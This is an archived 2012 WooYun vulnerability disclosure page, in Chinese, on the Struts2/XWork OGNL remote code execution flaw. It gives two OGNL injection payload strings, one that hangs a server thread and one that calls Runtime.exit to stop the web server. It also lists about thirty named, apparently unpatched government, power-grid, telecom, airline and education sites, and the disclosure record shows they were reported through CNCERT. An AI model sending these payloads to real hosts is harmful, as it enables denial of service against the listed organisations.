<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		xwork设计缺陷导致远程代码执行即首批政府类入围名单  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		xwork设计缺陷导致远程代码执行即首批政府类入围名单  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/shine">shine</a> 
</li><li>提交时间：		2012-05-29 12:49</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2012-05-29：	细节已通知厂商并且等待厂商处理中<br/>
									2012-05-29：	厂商已经确认，细节仅向厂商公开<br/>
									2012-06-08：	细节向核心白帽子及相关领域专家公开<br/>
									2012-06-18：	细节向普通白帽子公开<br/>
									2012-06-28：	细节向实习白帽子公开<br/>
									2012-07-13：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">  昨天，听@xsser说：“怀念中国移动大礼包”，如是做了个小测试，看半小时能找多少struts2那个老的远程代码执行漏洞站点或系统，没想到还有这么多，发出来，免得天天被人蹂躏还不知道怎么回事！<br />
<br />
  以下包括：国家电网、中国电信、中国移动、航空公司、政府部门类、教育类等站点或系统，多次测试结果都可以基本确认漏洞存在（如有误差请包涵！）。<br />
<br />
</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">  <br />
<br />
  以下站点或系统补丁不及时，测试代码如下（测试效果可能受不同系统架构的影响，如：cache服务器、集群系统、分布式系统，效果请耐心等待，自己没确认的就不方便发出）：<br />
<br />
<br />
<br />
sleep当前线程：<br />
<br />
<br />
<br />
<br />
<br />
</p><pre><code>?(&#039;\u0023_memberAccess[\&#039;allowStaticMethodAccess\&#039;]&#039;)(meh)=true&amp;(aaa)((&#039;\u0023context[\&#039;xwork.MethodAccessor.denyMethodExecution\&#039;]\u003d\u0023foo&#039;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#039;\u0023rt.sleep(999999999)&#039;)(\u0023rt\u003d@java.lang.Thread@currentThread()))=1</code></pre><p class='detail'><br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
关闭web服务器：<br />
<br />
<br />
<br />
<br />
<br />
</p><pre><code>?(&#039;\u0023_memberAccess[\&#039;allowStaticMethodAccess\&#039;]&#039;)(meh)=true&amp;(aaa)((&#039;\u0023context[\&#039;xwork.MethodAccessor.denyMethodExecution\&#039;]\u003d\u0023foo&#039;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#039;\u0023rt.exit(1)&#039;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</code></pre><p class='detail'><br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>hr.siat.ac.cn/staffLogin.action<br />
<br />
db.sme.gov.cn/doLogin.action<br />
<br />
218.25.36.44:6789/kjbm/login.action<br />
<br />
111.161.27.130/login.action<br />
<br />
（航空公司）<br />
www.capitalairlines.com.cn/login.action<br />
<br />
www.tianjin-air.com/login.action<br />
<br />
www.yiqilai.cn/login.action<br />
<br />
msp.fjtelecom.com/fjmsp/login/login.action<br />
<br />
www.zjelib.cn/login/login.action<br />
<br />
ycjy.scezju.com/jjxt/Index.action<br />
<br />
www.njzy666.com/index.action<br />
<br />
www.nbptweb.net/index.action<br />
<br />
www.sxaic.gov.cn/index.action<br />
<br />
219.144.196.194/index.action<br />
<br />
（国家电网，需检查其他同类产品）<br />
95598.ah.sgcc.com.cn/index.action<br />
<br />
95598.js.sgcc.com.cn/95598/index.action<br />
<br />
（与上面是同一个站点）<br />
www.js95598.com/95598/index.action<br />
<br />
www.xmzfbz.gov.cn/index.action<br />
<br />
www.ngfgj.cn:8001/pub/index.action<br />
<br />
hmt.studyatpku.com/shop/member!index.action<br />
<br />
www.ahkj.gov.cn/search/index.action<br />
<br />
wsbs.zjjxw.gov.cn/wireless/index.action<br />
<br />
123.232.123.23/index.action<br />
<br />
baoming.zjtvu.edu.cn/zscsxt/Index.action<br />
<br />
www.zca.gov.cn/index.action<br />
<br />
211.138.86.20/ArsOffice/main.action<br />
<br />
www.gd118114.cn/movie/index.action<br />
<br />
http://map.jyghj.gov.cn/GIS/index.action<br />
<br />
youth.aust.edu.cn:8080/xtw/news_index.action<br />
<br />
http://www.tshbj.gov.cn/portal/index/index.action<br />
<br />
www.studyintongji.com/shop/member!index.action</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail"> 使用CNCERT的分发功能，能提醒的都提醒一下吧！<br />
<br />
<br />
<br />
<br />
<br />
（哦！还有一个肯德基宅急送的系统，也分发一下！）<br />
<br />
<br />
<br />
</p><pre><code>http://www.4008823823.com.cn/kfcios/RegAction/login.action</code></pre><p class='detail'><br />
<br />
 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/shine" title="shine">shine</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07633" title="xwork设计缺陷导致远程代码执行即首批政府类入围名单">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2012-05-29 16:34</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">感谢shine同学的工作，同时强烈建议shine同学发表技术文档在zone.wooyun.org上。这些事件有一阵子来确认了，幸好目前已经积累了一些可控验证的用例，不过部分案例在复现时仍然不可避免会引起保护性危害。<br />
<br />
针对近期的struts xwork &lt;=2.2.0远程代码执行漏洞以及thinkphp的漏洞，建议白帽子可以将自己的成果汇总在wooyun上，同时一些有python\ruby脚本能力的同学，可以尝试完成更高级别的工作（这个可以有大礼包）。<br />
<br />
rank 20.</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

																	<p class="detail">2012-06-15：经过多日的验证及协调，目前上述涉及的政府、高校以及电信、电力、证券等相关行业网站已经派发事件完毕。</p>
											

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="7633";
var bugRating="2";
var myRating="";
var ratingCount="3";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
